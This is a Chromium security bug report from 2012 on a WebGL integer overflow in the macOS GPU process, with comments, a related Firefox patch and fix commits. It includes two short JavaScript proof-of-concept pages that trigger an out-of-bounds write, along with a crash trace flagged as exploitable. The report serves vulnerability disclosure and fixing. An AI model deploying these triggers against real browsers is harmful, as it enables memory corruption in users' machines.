# Security: integer overflow in webgl on osx

| Field | Value |
|-------|-------|
| **Issue ID** | [40075829](https://issues.chromium.org/issues/40075829) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals, Internals>GPU |
| **Platforms** | Mac |
| **Reporter** | mi...@gmail.com |
| **Assignee** | gm...@chromium.org |
| **Created** | 2012-09-14 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

integer overflow in webgl on osx

**VERSION**  

Chrome Version: stable + dev  

Operating System: 64bit osx mountain lion (10.8)

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
var gl = document.createElement('canvas').getContext('experimental-webgl')
gl.bindBuffer(gl.ELEMENT\_ARRAY\_BUFFER, gl.createBuffer())
gl.bufferData(gl.ELEMENT\_ARRAY\_BUFFER, new Uint8Array(1), gl.STATIC\_DRAW)
var magic = 0x20000
gl.bufferSubData(gl.ELEMENT\_ARRAY\_BUFFER, Math.pow(2,31)-magic, new Uint8Array(magic))
gl.bufferSubData(gl.ELEMENT\_ARRAY\_BUFFER, 1, new Uint8Array(magic/2))
}
</script>
</head>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: gpu  

Crash State:

=================================================================  

==37314== ERROR: AddressSanitizer crashed on unknown address 0x94e7ab80 (pc 0x951baa37 sp 0xbff5f3f0 bp 0xbff5f3f8 T0)  

AddressSanitizer can not provide additional info.  

#0 0x951baa36 in memmove$VARIANT$sse42 (in libsystem\_c.dylib) + 217  

#1 0x53e7cf2 in gpu::gles2::BufferManager::BufferInfo::SetRange(long, long, void const\*) (in Chromium Framework) + 306  

#2 0x54854cd in gpu::gles2::GLES2DecoderImpl::DoBufferSubData(unsigned int, long, long, void const\*) (in Chromium Framework) + 317

exception=EXC\_BAD\_ACCESS:signal=11:is\_exploitable=yes:instruction\_disassembly=movdqa %xmm0,(%edi,%edx):instruction\_address=0x00000000951baa37:access\_type=write:access\_address=0x00000000fae6caa0:

Exception Type: EXC\_BAD\_ACCESS (SIGSEGV)  

Exception Codes: KERN\_INVALID\_ADDRESS at 0x00000000fae6caa0

Thread 0 Crashed:: CrGpuMain Dispatch queue: com.apple.main-thread  

0 libsystem\_c.dylib 0x951baa37 memmove$VARIANT$sse42 + 218

## Attachments

- [really.html](attachments/really.html) (text/html; charset=us-ascii, 529 B)
- [really.txt](attachments/really.txt) (text/x-c; charset=us-ascii, 4.0 KB)
- [really.crashlog.txt](attachments/really.crashlog.txt) (text/plain; charset=us-ascii, 42.7 KB)

## Timeline

### sc...@gmail.com (2012-09-14)

Ken, don't you develop on a Mac? (If not, feel free to assign to someone who does)

@miaubiz: no repro on Linux 64-bit ?

### mi...@gmail.com (2012-09-15)

@scarybeasts: osx only for me. I found a similar issue in firefox two days ago that also affected only osx.

benoit jacob says: "The type of the size parameter to bufferData is like size_t. So on 64bit it is valid to pass up to 2^64-1. Apparently the Mac GL lib doesn't know that. This patch works around it by rejecting bufferData calls with size exceeding UINT32_MAX before passing them to the GL."

https://bugzilla.mozilla.org/show_bug.cgi?id=790879

this is the firefox repro:


<html>
  <head>
    <script>
      gl=document.createElement('canvas').getContext('experimental-webgl')
      var buf = gl.createBuffer()
      gl.bindBuffer(gl.ARRAY_BUFFER, buf)
      var magic = 0x12345678
      gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(magic+1), gl.STATIC_DRAW)
      gl.bufferData(gl.ARRAY_BUFFER, Math.pow(2, 32), gl.STATIC_DRAW)
      gl.bufferSubData(gl.ARRAY_BUFFER, magic, new Uint8Array(1))
    </script>
  </head>
</html>

this is his patch:

# HG changeset patch
# Parent 37b3187b7e6f0b07d2314cce2965b067ea254d24

diff --git a/content/canvas/src/WebGLContextGL.cpp b/content/canvas/src/WebGLContextGL.cpp
--- a/content/canvas/src/WebGLContextGL.cpp
+++ b/content/canvas/src/WebGLContextGL.cpp
@@ -412,16 +412,25 @@ WebGLContext::BlendFuncSeparate(WebGLenu
     gl->fBlendFuncSeparate(srcRGB, dstRGB, srcAlpha, dstAlpha);
 }
 
 GLenum WebGLContext::CheckedBufferData(GLenum target,
                                        GLsizeiptr size,
                                        const GLvoid *data,
                                        GLenum usage)
 {
+#ifdef XP_MACOSX
+    // https://crbug.com/chromium/790879
+    if (gl->WorkAroundDriverBugs() &&
+        int64_t(size) > INT32_MAX) // the cast avoids a potential always-true warning on 32bit
+    {
+        GenerateWarning("Rejecting valid bufferData call with size %lu to avoid a Mac bug", size);
+        return LOCAL_GL_INVALID_VALUE;
+    }
+#endif
     WebGLBuffer *boundBuffer = NULL;
     if (target == LOCAL_GL_ARRAY_BUFFER) {
         boundBuffer = mBoundArrayBuffer;
     } else if (target == LOCAL_GL_ELEMENT_ARRAY_BUFFER) {
         boundBuffer = mBoundElementArrayBuffer;
     }
     NS_ABORT_IF_FALSE(boundBuffer != nullptr, "no buffer bound for this target");
     



### sc...@gmail.com (2012-09-21)

I'm pretty sure this is the same root cause as https://crbug.com/chromium/149904.

### kb...@chromium.org (2012-09-26)

Actually, I think it's a different root cause and still isn't fixed. Reopening and taking this while I investigate it.


### [Deleted User] (2012-09-26)

[Empty comment from Monorail migration]

### gm...@chromium.org (2012-10-02)

I have a fix.  It only fails in release build. It's basically the same one suggested in https://crbug.com/chromium/149904

I still need to write some tests before uploading

### js...@chromium.org (2012-10-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-03)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=159915

------------------------------------------------------------------------
r159915 | gman@chromium.org | 2012-10-03T17:42:10.312820Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/service/buffer_manager_unittest.cc?r1=159915&r2=159914&pathrev=159915
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/service/buffer_manager.cc?r1=159915&r2=159914&pathrev=159915
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/service/buffer_manager.h?r1=159915&r2=159914&pathrev=159915

Fix SetRange bounds check.

Note: The old code was tested in unit tests but still passes on a release
build. That suggests there's a differerce between optimization levels
on the chrome target vs the gpu_uinttests target

BUG=149717


Review URL: https://chromiumcodereview.appspot.com/11053012
------------------------------------------------------------------------

### in...@chromium.org (2012-10-03)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-03)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=159940

------------------------------------------------------------------------
r159940 | gman@chromium.org | 2012-10-03T19:08:46.112553Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/gpu/command_buffer/service/buffer_manager_unittest.cc?r1=159940&r2=159939&pathrev=159940
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/gpu/command_buffer/service/buffer_manager.cc?r1=159940&r2=159939&pathrev=159940
   M http://src.chromium.org/viewvc/chrome/branches/1229/src/gpu/command_buffer/service/buffer_manager.h?r1=159940&r2=159939&pathrev=159940

Merge 159915 - Fix SetRange bounds check.

BUG=149717


Review URL: https://chromiumcodereview.appspot.com/11053012

TBR=gman@chromium.org
Review URL: https://codereview.chromium.org/11053019
------------------------------------------------------------------------

### bu...@chromium.org (2012-10-03)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=159943

------------------------------------------------------------------------
r159943 | gman@chromium.org | 2012-10-03T19:16:14.733890Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1271/src/gpu/command_buffer/service/buffer_manager.h?r1=159943&r2=159942&pathrev=159943
   M http://src.chromium.org/viewvc/chrome/branches/1271/src/gpu/command_buffer/service/buffer_manager_unittest.cc?r1=159943&r2=159942&pathrev=159943
   M http://src.chromium.org/viewvc/chrome/branches/1271/src/gpu/command_buffer/service/buffer_manager.cc?r1=159943&r2=159942&pathrev=159943

Merge 159915 - Fix SetRange bounds check.

BUG=149717


Review URL: https://chromiumcodereview.appspot.com/11053012

TBR=gman@chromium.org
Review URL: https://codereview.chromium.org/11060009
------------------------------------------------------------------------

### sc...@gmail.com (2012-10-04)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-10-04)

cc: @kerz so he can see that this was merged to M22. Hopefully it wasn't a bad time!

### sc...@gmail.com (2012-10-29)

@miaubiz: I think we may have released this fix without proper release notes as part of the Pwnium patch -- oops!

Anyway, $1000, thanks!

### sc...@gmail.com (2012-12-14)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/149717?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Internals, Internals>GPU]
[Monorail mergedwith: crbug.com/chromium/153037]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40075829)*
